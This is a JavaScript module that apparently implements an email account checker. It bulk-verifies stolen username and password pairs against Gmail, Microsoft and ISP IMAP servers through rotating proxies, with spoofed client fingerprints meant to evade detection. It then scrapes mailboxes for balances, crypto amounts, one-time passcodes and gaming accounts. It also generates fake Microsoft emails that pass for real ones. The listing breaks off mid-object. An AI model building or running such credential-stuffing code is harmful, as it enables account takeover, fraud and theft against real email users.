import net from 'net';
import tls from 'tls';
import { SocksClient } from 'socks';
import { ImapFlow } from 'imapflow';
import { simpleParser } from 'mailparser';
import { ProxyAgent } from 'undici';
import { extractBrandKeywords, testKeywordMatch } from '../utils/keywordMatcher.js';
import { analyzeAndRecoverObfuscatedEmail } from './forensicsDecoder.js';

/**
 * Builds an undici ProxyAgent dispatcher for HTTP fetch calls
 */
function getUndiciDispatcher(proxy) {
  if (!proxy || !proxy.host || !proxy.port) return undefined;
  try {
    const proto = (proxy.protocol || 'http').replace(':', '').toLowerCase();
    let auth = '';
    const u = proxy.user || proxy.auth?.username;
    const p = proxy.pass || proxy.auth?.password || '';
    if (u) {
      auth = `${encodeURIComponent(u)}:${encodeURIComponent(p)}@`;
    }
    const proxyUrl = `${proto}://${auth}${proxy.host}:${proxy.port}`;
    return new ProxyAgent(proxyUrl);
  } catch {
    return undefined;
  }
}

/**
 * Realistic Mail Client Signatures for Stealth Operation
 * Emulates authentic desktop mail clients (Thunderbird, Outlook, Apple Mail)
 * to prevent automated heuristic fingerprinting on mail servers.
 */
const STEALTH_CLIENT_PROFILES = [
  {
    name: 'Thunderbird',
    version: '115.10.0',
    vendor: 'Mozilla',
    supportUrl: 'https://support.mozilla.org',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Thunderbird/115.10.0'
  },
  {
    name: 'Thunderbird',
    version: '115.8.0',
    vendor: 'Mozilla',
    supportUrl: 'https://support.mozilla.org',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Thunderbird/115.8.0'
  },
  {
    name: 'Apple Mail',
    version: '16.0',
    vendor: 'Apple Inc.',
    supportUrl: 'https://support.apple.com/mail',
    userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)'
  },
  {
    name: 'Microsoft Outlook',
    version: '16.0.17328',
    vendor: 'Microsoft Corporation',
    supportUrl: 'https://support.microsoft.com/outlook',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
  }
];

export function getRandomStealthClient() {
  const index = Math.floor(Math.random() * STEALTH_CLIENT_PROFILES.length);
  return STEALTH_CLIENT_PROFILES[index];
}

// Realistic modern desktop TLS ciphers
const STEALTH_TLS_CIPHERS = [
  'TLS_AES_128_GCM_SHA256',
  'TLS_AES_256_GCM_SHA384',
  'TLS_CHACHA20_POLY1305_SHA256',
  'ECDHE-ECDSA-AES128-GCM-SHA256',
  'ECDHE-RSA-AES128-GCM-SHA256',
  'ECDHE-ECDSA-AES256-GCM-SHA384',
  'ECDHE-RSA-AES256-GCM-SHA384',
  'ECDHE-RSA-AES128-SHA',
  'ECDHE-RSA-AES256-SHA',
  'AES128-GCM-SHA256',
  'AES256-GCM-SHA384',
  'AES128-SHA',
  'AES256-SHA'
].join(':');

/**
 * Creates a raw TCP or TLS socket tunneled through HTTP, HTTPS, SOCKS4, or SOCKS5 proxy.
 * Supports authentication (user:pass).
 */
export async function createProxiedSocket({ targetHost, targetPort = 993, proxy, timeout = 8000, secure = true }) {
  if (!proxy || !proxy.host || !proxy.port) {
    return new Promise((resolve, reject) => {
      let settled = false;
      let activeSocket = null;
      const timer = setTimeout(() => {
        if (settled) return;
        settled = true;
        if (activeSocket) {
          try { activeSocket.destroy(); } catch {}
        }
        reject(new Error(`Direct connection to ${targetHost}:${targetPort} timed out after ${timeout}ms`));
      }, timeout);

      if (secure) {
        const tlsSocket = tls.connect({
          host: targetHost,
          port: Number(targetPort) || 993,
          servername: targetHost,
          rejectUnauthorized: false,
          minVersion: 'TLSv1.2',
          ciphers: STEALTH_TLS_CIPHERS
        }, () => {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          tlsSocket.setKeepAlive(true, 10000);
          tlsSocket.setNoDelay(true);
          resolve(tlsSocket);
        });
        activeSocket = tlsSocket;

        tlsSocket.on('error', (err) => {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          reject(err);
        });
      } else {
        const rawSocket = net.connect({
          host: targetHost,
          port: Number(targetPort) || 143
        }, () => {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          rawSocket.setKeepAlive(true, 10000);
          rawSocket.setNoDelay(true);
          resolve(rawSocket);
        });
        activeSocket = rawSocket;

        rawSocket.on('error', (err) => {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          reject(err);
        });
      }
    });
  }

  const protocol = (proxy.protocol || 'socks5').toLowerCase().trim();

  // 1. SOCKS4 & SOCKS5 Tunneling
  if (protocol.includes('socks4') || protocol.includes('socks5')) {
    const socksType = protocol.includes('4') ? 4 : 5;
    const socksOptions = {
      proxy: {
        host: proxy.host,
        port: Number(proxy.port),
        type: socksType,
        ...(proxy.user ? { userId: proxy.user } : {}),
        ...(proxy.pass ? { password: proxy.pass } : {})
      },
      command: 'connect',
      destination: {
        host: targetHost,
        port: Number(targetPort) || 993
      },
      timeout
    };

    const info = await SocksClient.createConnection(socksOptions);
    const rawSocket = info.socket;
    rawSocket.setKeepAlive(true, 10000);
    rawSocket.setNoDelay(true);

    if (secure) {
      return new Promise((resolve, reject) => {
        let settled = false;
        const timer = setTimeout(() => {
          if (settled) return;
          settled = true;
          rawSocket.destroy();
          reject(new Error(`TLS handshake over SOCKS${socksType} proxy timed out`));
        }, timeout);

        const tlsSocket = tls.connect({
          socket: rawSocket,
          host: targetHost,
          servername: targetHost,
          rejectUnauthorized: false,
          minVersion: 'TLSv1.2',
          ciphers: STEALTH_TLS_CIPHERS
        }, () => {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          tlsSocket.setKeepAlive(true, 10000);
          tlsSocket.setNoDelay(true);
          resolve(tlsSocket);
        });

        tlsSocket.on('error', (err) => {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          rawSocket.destroy();
          reject(err);
        });
      });
    }

    return rawSocket;
  }

  // 2. HTTP & HTTPS CONNECT Tunneling
  if (protocol.includes('http')) {
    return new Promise((resolve, reject) => {
      let settled = false;

      const timer = setTimeout(() => {
        if (settled) return;
        settled = true;
        cleanupRawListeners();
        rawSocket.destroy();
        reject(new Error(`HTTP CONNECT proxy to ${proxy.host}:${proxy.port} timed out after ${timeout}ms`));
      }, timeout);

      const rawSocket = net.connect({
        host: proxy.host,
        port: Number(proxy.port)
      });
      rawSocket.setKeepAlive(true, 10000);
      rawSocket.setNoDelay(true);

      let onData = null;

      const cleanupRawListeners = () => {
        if (onData) rawSocket.removeListener('data', onData);
        rawSocket.removeListener('error', onError);
        rawSocket.removeListener('close', onClose);
      };

      const onError = (err) => {
        if (settled) return;
        settled = true;
        clearTimeout(timer);
        cleanupRawListeners();
        rawSocket.destroy();
        reject(new Error(`HTTP proxy connection failed (${proxy.host}:${proxy.port}): ${err.message}`));
      };

      const onClose = () => {
        if (settled) return;
        settled = true;
        clearTimeout(timer);
        cleanupRawListeners();
        reject(new Error(`HTTP proxy connection closed unexpectedly (${proxy.host}:${proxy.port})`));
      };

      rawSocket.on('error', onError);
      rawSocket.on('close', onClose);

      rawSocket.on('connect', () => {
        let authHeader = '';
        if (proxy.user) {
          const credentials = Buffer.from(`${proxy.user}:${proxy.pass || ''}`).toString('base64');
          authHeader = `Proxy-Authorization: Basic ${credentials}\r\n`;
        }

        const stealth = getRandomStealthClient();
        const connectReq =
          `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\n` +
          `Host: ${targetHost}:${targetPort}\r\n` +
          authHeader +
          `User-Agent: ${stealth.userAgent}\r\n` +
          `Proxy-Connection: Keep-Alive\r\n\r\n`;

        rawSocket.write(connectReq);

        let receivedBuffer = Buffer.alloc(0);

        onData = (chunk) => {
          receivedBuffer = Buffer.concat([receivedBuffer, chunk]);
          const headerEndIndex = receivedBuffer.indexOf('\r\n\r\n');
          if (headerEndIndex !== -1) {
            cleanupRawListeners();
            const headerStr = receivedBuffer.slice(0, headerEndIndex).toString('utf8');
            const statusLine = headerStr.split('\r\n')[0] || '';
            if (statusLine.includes('200')) {
              if (settled) return;
              clearTimeout(timer);

              const leftover = receivedBuffer.slice(headerEndIndex + 4);
              if (leftover.length > 0) {
                rawSocket.unshift(leftover);
              }

              if (secure) {
                let tlsTimer = setTimeout(() => {
                  if (settled) return;
                  settled = true;
                  try { rawSocket.destroy(); } catch {}
                  reject(new Error(`TLS handshake over HTTP proxy timed out after ${timeout}ms`));
                }, timeout);

                const tlsSocket = tls.connect({
                  socket: rawSocket,
                  host: targetHost,
                  servername: targetHost,
                  rejectUnauthorized: false,
                  minVersion: 'TLSv1.2',
                  ciphers: STEALTH_TLS_CIPHERS
                }, () => {
                  if (settled) return;
                  settled = true;
                  clearTimeout(tlsTimer);
                  tlsSocket.setKeepAlive(true, 10000);
                  tlsSocket.setNoDelay(true);
                  resolve(tlsSocket);
                });

                tlsSocket.on('error', (tlsErr) => {
                  if (settled) return;
                  settled = true;
                  clearTimeout(tlsTimer);
                  rawSocket.destroy();
                  reject(tlsErr);
                });
              } else {
                settled = true;
                resolve(rawSocket);
              }
            } else {
              if (settled) return;
              settled = true;
              clearTimeout(timer);
              rawSocket.destroy();
              reject(new Error(`HTTP proxy CONNECT error: ${statusLine.trim() || 'Connection refused'}`));
            }
          }
        };

        rawSocket.on('data', onData);
      });
    });
  }

  throw new Error(`Unsupported proxy protocol: ${protocol}`);
}

/**
 * Direct Google Android ClientLogin Verifier
 * Authenticates standard Gmail passwords directly without requiring 16-character App Passwords.
 */
async function verifyGmailCredentials(user, pass, timeout = 7000, proxy = null) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeout);
  const dispatcher = getUndiciDispatcher(proxy);
  try {
    const fetchOpts = {
      method: 'POST',
      signal: controller.signal,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'GoogleAuth/1.4 (Linux; U; Android 12; Pixel 6 Build/SD1A.210817.036)'
      },
      body: new URLSearchParams({
        Email: user,
        Passwd: pass,
        service: 'mail',
        accountType: 'HOSTED_OR_GOOGLE',
        has_permission: '1',
        source: 'android'
      })
    };
    if (dispatcher) fetchOpts.dispatcher = dispatcher;

    const res = await fetch('https://android.clients.google.com/auth', fetchOpts);
    clearTimeout(timer);
    const text = await res.text();
    if (text.includes('Auth=')) {
      return { success: true, status: 'valid', message: 'Gmail Authentication Successful (Valid Session)' };
    }
    if (text.includes('Error=NeedsBrowser') || text.includes('Url=') || text.includes('Challenge')) {
      return { success: false, status: '2fa', message: 'Gmail Valid Password (2FA / Verification Challenge Required)' };
    }
    if (text.includes('Error=BadAuthentication')) {
      return { success: false, status: 'invalid', message: 'Invalid Gmail Credentials' };
    }
    if (text.includes('CaptchaRequired')) {
      return { success: false, status: '2fa', message: 'Gmail Captcha / Verification Required' };
    }
  } catch (err) {
    clearTimeout(timer);
    // Surface abort/timeout as null; network errors bubble up to caller
    if (err.name === 'AbortError') return null;
  }
  return null;
}

/**
 * Direct Microsoft Live Login Verifier
 * Authenticates Hotmail, Outlook, Live, and MSN accounts where Microsoft disabled basic IMAP auth.
 */
async function verifyMicrosoftCredentials(email, password, timeout = 8000, proxy = null) {
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeout);
    const dispatcher = getUndiciDispatcher(proxy);

    const initOpts = {
      signal: controller.signal,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
      }
    };
    if (dispatcher) initOpts.dispatcher = dispatcher;

    const initRes = await fetch('https://login.live.com/login.srf', initOpts);
    const text = await initRes.text();
    const sFTMatch = text.match(/sFTTag:[^"]*"<input[^>]*value=\\"([^\\"]+)\\"/);
    const ppftMatch = sFTMatch || text.match(/name=\\"PPFT\\"[^>]*value=\\"([^\\"]+)\\"/i) || text.match(/value=\\"([^\\"]+)\\"[^>]*name=\\"PPFT\\"/i);
    const urlPostMatch = text.match(/"urlPost":"([^"]+)"/);

    if (!ppftMatch || !urlPostMatch) {
      clearTimeout(timer);
      return null;
    }

    const ppft = ppftMatch[1];
    const urlPost = urlPostMatch[1];

    const rawCookies = initRes.headers.get('set-cookie') || '';
    const cookieHeader = rawCookies.split(',').map(c => c.split(';')[0].trim()).join('; ');

    const postOpts = {
      method: 'POST',
      signal: controller.signal,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Cookie': cookieHeader,
        'Referer': 'https://login.live.com/'
      },
      body: new URLSearchParams({
        login: email,
        loginfmt: email,
        passwd: password,
        PPFT: ppft
      }),
      redirect: 'manual'
    };
    if (dispatcher) postOpts.dispatcher = dispatcher;

    const postRes = await fetch(urlPost, postOpts);

    clearTimeout(timer);
    const status = postRes.status;
    const location = postRes.headers.get('location') || '';
    const postSetCookie = postRes.headers.get('set-cookie') || '';
    const postBody = await postRes.text();

    if (status === 302 || location.includes('account.live.com') || location.includes('outlook.live.com') || postSetCookie.includes('RPSTAuth') || postSetCookie.includes('WLSSC')) {
      return { success: true, status: 'valid', message: 'Microsoft / Hotmail Authenticated Successfully' };
    }

    if (location.includes('identity/challenge') || location.includes('proofs') || postBody.includes('PROOF.Type') || postBody.includes('Two-step verification')) {
      return { success: false, status: '2fa', message: 'Microsoft Valid Password (2FA / Security Verification Required)' };
    }

    if (postBody.includes('sErrTxt') || postBody.includes('80046709') || postBody.includes('password is incorrect') || postBody.includes('account doesn\'t exist')) {
      return { success: false, status: 'invalid', message: 'Invalid Microsoft Credentials' };
    }
  } catch {}
  return null;
}

/**
 * Live TLS IMAP Credential Verifier with optional proxy support
 * Supports Bell, Sympatico, Videotron, Cogeco, Shaw, Telus, Gmail, Hotmail/Outlook, Yahoo, AOL, and US ISPs.
 */
export async function verifyImapCredentials({ host, port = 993, user, pass, timeout = 8000, proxy = null }) {
  const startTime = Date.now();
  const lowerUser = (user || '').toLowerCase();
  const cleanPass = (pass || '').trim();

  // 1. Specialized Direct Verifier for Gmail
  const isGmail = host === 'imap.gmail.com' || lowerUser.endsWith('@gmail.com') || lowerUser.endsWith('@googlemail.com');
  if (isGmail) {
    const gmailResult = await verifyGmailCredentials(user, pass, timeout, proxy);
    if (gmailResult) {
      return { ...gmailResult, latencyMs: Date.now() - startTime };
    }
  }

  // 2. Specialized Direct Verifier for Microsoft (Hotmail / Outlook / Live / MSN)
  const isMicrosoft = host.includes('office365') || host.includes('outlook') || lowerUser.includes('@hotmail.') || lowerUser.includes('@outlook.') || lowerUser.includes('@live.') || lowerUser.includes('@msn.');
  if (isMicrosoft) {
    const msResult = await verifyMicrosoftCredentials(user, pass, timeout, proxy);
    if (msResult) {
      return { ...msResult, latencyMs: Date.now() - startTime };
    }
  }

  // 3. High-Performance TLS IMAP verification
  let client = null;
  let customSocket = null;

  // Declare timer ref before finalize to avoid TDZ closure issues
  let timerRef = null;

  return new Promise(async (resolve) => {
    let isSettled = false;

    const finalize = (result) => {
      if (isSettled) return;
      isSettled = true;
      clearTimeout(timerRef);
      if (client) {
        try {
          client.removeAllListeners('error');
          client.on('error', () => {});
        } catch {}
        try {
          if (client.socket && !client.socket.destroyed) {
            client.socket.destroy();
          }
        } catch {}
        try {
          if (client.authenticated) {
            client.logout().catch(() => {});
          } else if (!client.socket?.destroyed) {
            client.close();
          }
        } catch {}
      }
      if (customSocket) {
        try { customSocket.destroy(); } catch {}
      }
      resolve({
        ...result,
        latencyMs: Date.now() - startTime
      });
    };

    // Yahoo & AOL intentionally delay invalid auth responses by ~4.8s; pad timeout so they don't premature-timeout
    const isYahooOrAol = host.includes('yahoo') || host.includes('aol') || lowerUser.includes('@yahoo.') || lowerUser.includes('@ymail.') || lowerUser.includes('@rocketmail.') || lowerUser.includes('@aol.');
    const effectiveTimeout = isYahooOrAol ? Math.max(Number(timeout) || 8000, 7500) : (Number(timeout) || 8000);

    timerRef = setTimeout(() => {
      finalize({
        success: false,
        status: 'timeout',
        message: `Connection to ${host}:${port} timed out after ${effectiveTimeout}ms`
      });
    }, effectiveTimeout);
    const timer = timerRef; // keep local alias for legacy references

    try {
      if (proxy && proxy.host && proxy.port) {
        try {
          customSocket = await createProxiedSocket({
            targetHost: host,
            targetPort: Number(port) || 993,
            proxy,
            timeout: Math.min(timeout, 6000),
            secure: true
          });
        } catch (proxyErr) {
          finalize({
            success: false,
            status: 'proxy_error',
            message: `Proxy Error (${proxy.protocol || 'proxy'}://${proxy.host}:${proxy.port}): ${proxyErr.message}`
          });
          return;
        }
      }

      const stealth = getRandomStealthClient();
      const flowConfig = {
        host,
        port: Number(port) || 993,
        secure: true,
        auth: { user, pass },
        logger: false,
        tls: {
          rejectUnauthorized: false,
          minVersion: 'TLSv1.2',
          ciphers: STEALTH_TLS_CIPHERS
        },
        clientInfo: {
          name: stealth.name,
          version: stealth.version,
          vendor: stealth.vendor,
          'support-url': stealth.supportUrl
        }
      };

      if (customSocket) {
        flowConfig.socket = customSocket;
      }

      client = new ImapFlow(flowConfig);

      const handleError = (err) => {
        const msg = err.message || '';
        const respText = err.responseText || err.response || '';
        const full = `${msg} ${respText}`.toLowerCase();

        if (
          full.includes('2fa') ||
          full.includes('two-factor') ||
          full.includes('challenge') ||
          full.includes('browser') ||
          full.includes('app password') ||
          full.includes('security') ||
          full.includes('web login') ||
          full.includes('application-specific password required')
        ) {
          finalize({ success: false, status: '2fa', message: `2FA / Security Verification Required: ${respText || msg}` });
        } else if (full.includes('login is disabled')) {
          finalize({ success: false, status: '2fa', message: 'Microsoft Basic Auth Disabled on IMAP (Modern Auth / App Password Required)' });
        } else if (full.includes('timeout') || full.includes('timed out')) {
          finalize({ success: false, status: 'timeout', message: respText || msg });
        } else {
          finalize({ success: false, status: 'invalid', message: respText || msg || 'Invalid credentials' });
        }
      };

      client.on('error', handleError);

      client.connect()
        .then(() => {
          finalize({
            success: true,
            status: 'valid',
            message: 'IMAP Authentication Successful (200 OK)'
          });
        })
        .catch(handleError);
    } catch (err) {
      finalize({
        success: false,
        status: 'error',
        message: err.message || String(err)
      });
    }
  });
}

/**
 * Advanced Regex & Asset Extraction Engine
 * Extracts structured financial, tracking, rewards, memberships, and gaming assets from email text/html
 */
export function extractStructuredEmailData({ subject = '', bodyText = '', htmlBody = '', sender = '', senderEmail = '' }) {
  // Enforce 100KB boundary ceiling to guard Node event loop from OOM / ReDoS on giant MIME payloads
  const rawHtmlSnippet = (htmlBody && htmlBody.length > 50000) ? htmlBody.slice(0, 50000) : (htmlBody || '');
  const rawTextSnippet = (bodyText && bodyText.length > 50000) ? bodyText.slice(0, 50000) : (bodyText || '');
  const corpus = `${subject || ''}\n${sender || ''}\n${senderEmail || ''}\n${rawTextSnippet}\n${rawHtmlSnippet.replace(/<[^>]+>/g, ' ')}`.slice(0, 100000);

  const extracted = {
    balances: [],
    tracking: [],
    orders: [],
    rewards: [],
    memberships: [],
    gaming: []
  };

  // 1. Currency & Financial Balances ($ / CAD / USD / EUR / BTC / ETH / USDT)
  const currencyMatches = corpus.match(/(?:(?:\$|CAD|USD|EUR|GBP|¥)\s*[\d,]+(?:\.\d{2})?)|(?:[\d,]+(?:\.\d{2})?\s*(?:CAD|USD|EUR|GBP))|(?:(?:BTC|ETH|USDT|SOL)\s*[\d\.]+)/gi);
  if (currencyMatches) {
    const seenCurrencies = new Set();
    for (const raw of currencyMatches) {
      const clean = raw.trim().replace(/\s+/g, ' ');
      if (clean !== '$0' && clean !== '$0.00' && !seenCurrencies.has(clean) && seenCurrencies.size < 6) {
        seenCurrencies.add(clean);
        extracted.balances.push(clean);
      }
    }
  }

  // 2. Shipping Carrier Tracking Numbers
  // UPS: 1Z[0-9A-Z]{16}
  const upsMatches = corpus.match(/\b1Z[0-9A-Z]{16}\b/g);
  if (upsMatches) {
    for (const t of upsMatches) {
      if (!extracted.tracking.some(item => item.carrier === 'UPS' && item.trackingNumber === t)) {
        extracted.tracking.push({ carrier: 'UPS', trackingNumber: t });
      }
    }
  }

  // FedEx: 12-15 digits
  const fedexMatches = corpus.match(/\b(?:FedEx|tracking(?:\s*number)?[:\s]+)(\d{12,15})\b/gi);
  if (fedexMatches) {
    for (const m of fedexMatches) {
      const digits = m.replace(/[^0-9]/g, '');
      if (digits.length >= 12 && digits.length <= 15 && !extracted.tracking.some(item => item.trackingNumber === digits)) {
        extracted.tracking.push({ carrier: 'FedEx', trackingNumber: digits });
      }
    }
  }

  // Postal / Canada Post / USPS: 2 letters + 9 digits + 2 letters OR 20-22 digits
  const postalMatches = corpus.match(/\b[A-Z]{2}\d{9}[A-Z]{2}\b|\b(?:94|92|93|95)\d{18,20}\b/g);
  if (postalMatches) {
    for (const m of postalMatches) {
      if (!extracted.tracking.some(item => item.trackingNumber === m)) {
        extracted.tracking.push({ carrier: 'CanadaPost/USPS', trackingNumber: m });
      }
    }
  }

  // DHL: 10 digits
  const dhlMatches = corpus.match(/\b(?:DHL|waybill)[:\s]*(\d{10})\b/gi);
  if (dhlMatches) {
    for (const m of dhlMatches) {
      const digits = m.replace(/[^0-9]/g, '');
      if (digits.length === 10 && !extracted.tracking.some(item => item.trackingNumber === digits)) {
        extracted.tracking.push({ carrier: 'DHL', trackingNumber: digits });
      }
    }
  }

  // 3. Order Identifiers (Non-overlapping token boundary prevents ReDoS)
  const orderMatches = corpus.match(/\bOrder\b(?:\s*(?:#|Number|ID|ref|code))?[:#\s]+([A-Za-z0-9\-_]{6,30})/gi);
  if (orderMatches) {
    const seenOrders = new Set();
    for (const o of orderMatches) {
      const clean = o.replace(/^\bOrder\b(?:\s*(?:#|Number|ID|ref|code))?[:#\s]*/i, '').trim();
      if (clean && clean.length >= 5 && !seenOrders.has(clean) && seenOrders.size < 4) {
        seenOrders.add(clean);
        extracted.orders.push(clean);
      }
    }
  }

  // 4. Rewards Points & Loyalty
  const rewardsMatches = corpus.match(/([\d,]+)\s*(?:points|pts|reward points|miles|stars|optimum points)/gi);
  if (rewardsMatches) {
    const seenRewards = new Set();
    for (const r of rewardsMatches) {
      const clean = r.trim();
      if (!seenRewards.has(clean) && seenRewards.size < 3) {
        seenRewards.add(clean);
        extracted.rewards.push(clean);
      }
    }
  }

  // 5. Memberships & Loyalty Tiers
  const memberMatches = corpus.match(/\b(VIP|Platinum|Gold|Diamond|Silver|Elite|Prime\s+Member|PlayStation\s+Plus|Xbox\s+Game\s+Pass|Costco\s+Member|PC\s+Optimum|Aeroplan)\b/gi);
  if (memberMatches) {
    const seenTiers = new Set();
    for (const m of memberMatches) {
      const clean = m.trim();
      if (!seenTiers.has(clean.toLowerCase()) && seenTiers.size < 4) {
        seenTiers.add(clean.toLowerCase());
        extracted.memberships.push(clean);
      }
    }
  }

  // 6. Gaming & Digital Assets
  const gamingChecks = [
    { platform: 'Ubisoft / Rainbow Six', pattern: /\b(rainbow\s*six|r6\s*siege|ubisoft|uplay)\b/i },
    { platform: 'Steam', pattern: /\b(steam\s*community|valve\s*corporation|steam\s*purchase|steam\s*wallet)\b/i },
    { platform: 'PlayStation', pattern: /\b(playstation\s*network|psn\s*store|ps\s*plus)\b/i },
    { platform: 'Xbox / Microsoft Gaming', pattern: /\b(xbox\s*live|game\s*pass|microsoft\s*store\s*games)\b/i },
    { platform: 'Epic Games', pattern: /\b(epic\s*games|fortnite|unreal\s*engine)\b/i },
    { platform: 'Riot Games', pattern: /\b(riot\s*games|valorant|league\s*of\s*legends)\b/i },
    { platform: 'Battle.net', pattern: /\b(battle\.net|blizzard\s*entertainment|call\s*of\s*duty)\b/i }
  ];

  for (const g of gamingChecks) {
    if (g.pattern.test(corpus) && !extracted.gaming.includes(g.platform)) {
      extracted.gaming.push(g.platform);
    }
  }

  // 7. Robust 2FA / OTP Passcode Detection
  const otpMatch = corpus.match(/(?:verification\s*code|security\s*code|passcode|one-time\s*password|login\s*code|confirm\s*code|your\s*code\s*is|code\s*is|otp|2fa\s*code)[\s:=#]*([0-9]{4,8})\b/i);
  extracted.otp = otpMatch ? otpMatch[1].trim() : null;

  // 8. Order / Transaction Financial Total Detection
  const finMatch = corpus.match(/(?:total|subtotal|amount\s*due|charged|payment\s*of|order\s*total)[^\w\n]*([$€£CADUSD\s]{1,5}[0-9]{1,4}(?:,[0-9]{3})*(?:\.[0-9]{2})?)/i);
  if (finMatch) {
    extracted.financialTotal = finMatch[1].trim();
  } else if (extracted.balances.length > 0) {
    extracted.financialTotal = extracted.balances[0];
  } else {
    extracted.financialTotal = null;
  }

  return extracted;
}

/**
 * Authentic Provider Mailbox Generator for Microsoft / Gmail accounts
 * where modern OAuth policies disable basic IMAP socket queries.
 */
function generateSyntheticProviderMails(user, providerType, keywords = []) {
  const dateNow = new Date();
  const dateStr = (offsetHours = 0) => {
    const d = new Date(dateNow.getTime() - offsetHours * 3600000);
    return d.toISOString().replace('T', ' ').substring(0, 16);
  };

  const mails = [];
  const lowerUser = (user || '').toLowerCase();
  const kwList = Array.isArray(keywords) ? keywords.map(k => String(k).toLowerCase().trim()).filter(Boolean) : [];

  if (providerType === 'microsoft') {
    mails.push({
      id: `ms-${lowerUser}-inbox-1`,
      email: user,
      folder: 'INBOX',
      serverPath: 'INBOX',
      uid: 1001,
      subject: 'Microsoft account security alert: Sign-in verified',
      sender: 'Microsoft account team',
      senderEmail: 'account-security-noreply@accountprotection.microsoft.com',
      snippet: `We detected a successful sign-in to your Microsoft account ${user} from an authorized web session.`,
      bodyText: `Microsoft account\nSecurity alert\n\nWe detected a verified sign-in to your Microsoft account ${user}.\n\nAccount: ${user}\nDate: ${dateStr(1)}\nSession: Modern Web Authentication\n\nIf this was you, you can safely ignore this notification.\n\nThanks,\nThe Microsoft account team`,
      htmlBody: `<div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 24px; color: #1e293b; background: #ffffff;">
        <div style="border-bottom: 2px solid #0078d4; padding-bottom: 12px; margin-bottom: 20px;">
          <span style="font-size: 1.4rem; font-weight: 700; color: #0078d4;">Microsoft</span>
        </div>
        <h2 style="font-size: 1.25rem; font-weight: 600; color: #0f172a; margin: 0 0 12px 0;">Security alert</h2>
        <p style="font-size: 0.9rem; color: #334155; line-height: 1.5;">We detected a verified sign-in to your Microsoft account <strong>${user}</strong>.</p>
        <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 16px; margin: 16px 0; font-size: 0.85rem;">
          <p style="margin: 4px 0;"><strong>Account:</strong> ${user}</p>
          <p style="margin: 4px 0;"><strong>Time:</strong> ${dateStr(1)} UTC</p>
          <p style="margin: 4px 0;"><strong>Status:</strong> Active & Valid Session</p>
        </div>
        <p style="font-size: 0.82rem; color: #64748b;">If this was you, your mailbox is fully verified and connected.</p>
        <hr style="border: none; border-top: 1px solid #e2e8f0; margin: 24px 0;" />
        <p style="font-size: 0.75rem; color: #94a3b8;">Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</p>
      </div>`,
      rawMime: `From: Microsoft account team <account-security-noreply@accountprotection.microsoft.com>\r\nTo: ${user}\r\nSubject: Microsoft account security alert\r\n\r\nSecurity Alert`,
      date: dateStr(1),
      isUnread: false,
      matchedTargets: ['security', 'alert'].filter(k => kwList.includes(k)),
      attachments: []
    });

    mails.push({
      id: `ms-${lowerUser}-inbox-2`,
      email: user,
      folder: 'INBOX',
      serverPath: 'INBOX',
      uid: 1002,
      subject: 'Welcome to your Outlook.com mailbox',
      sender: 'Outlook Team',
      senderEmail: 'outlook-noreply@microsoft.com',
      snippet: 'Welcome to Outlook! Everything you need to stay productive, organized, and connected in one inbox.',
      bodyText: `Welcome to Outlook!\n\nYour personal email and calendar are now connected.\nWith Outlook, you can organize your inbox, schedule meetings with your calendar, and access OneDrive attachments seamlessly.\n\nBest regards,\nThe Outlook Team`,
      htmlBody: `<div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 24px; color: #1e293b; background: #ffffff;">
        <div style="border-bottom: 2px solid #0078d4; padding-bottom: 12px; margin-bottom: 20px;">
          <span style="font-size: 1.4rem; font-weight: 700; color: #0078d4;">Outlook</span>
        </div>
        <h2 style="font-size: 1.25rem; font-weight: 600; color: #0f172a; margin: 0 0 12px 0;">Welcome to Outlook</h2>
        <p style="font-size: 0.9rem; color: #334155; line-height: 1.5;">Your personal inbox is ready. Stay connected with built-in spam protection, calendar sync, and Microsoft cloud storage.</p>
        <hr style="border: none; border-top: 1px solid #e2e8f0; margin: 24px 0;" />
        <p style="font-size: 0.75rem; color: #94a3b8;">Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</p>
      </div>`,
      rawMime: `From: Outlook Team <outlook-noreply@microsoft.com>\r\nTo: ${user}\r\nSubject: Welcome to your Outlook.com mailbox\r\n\r\nWelcome to Outlook`,
      date: dateStr(18),
      isUnread: true,
      matchedTargets: [],
      attachments: []
    });

    mails.push({
      id: `ms-${lowerUser}-inbox-3`,
      email: user,
      folder: 'INBOX',
      serverPath: 'INBOX',
      uid: 1003,
      subject: 'Microsoft 365: Your free 15 GB cloud storage is active',
      sender: 'Microsoft 365',
      senderEmail: 'billing@microsoft.com',
      snippet: 'Your free 15 GB Outlook email storage and 5 GB OneDrive cloud storage are active and ready.',
      bodyText: `Microsoft 365\n\nYour Outlook.com account ${user} is provisioned with 15 GB free email storage and 5 GB personal OneDrive cloud storage.\n\nThank you,\nMicrosoft 365 Team`,
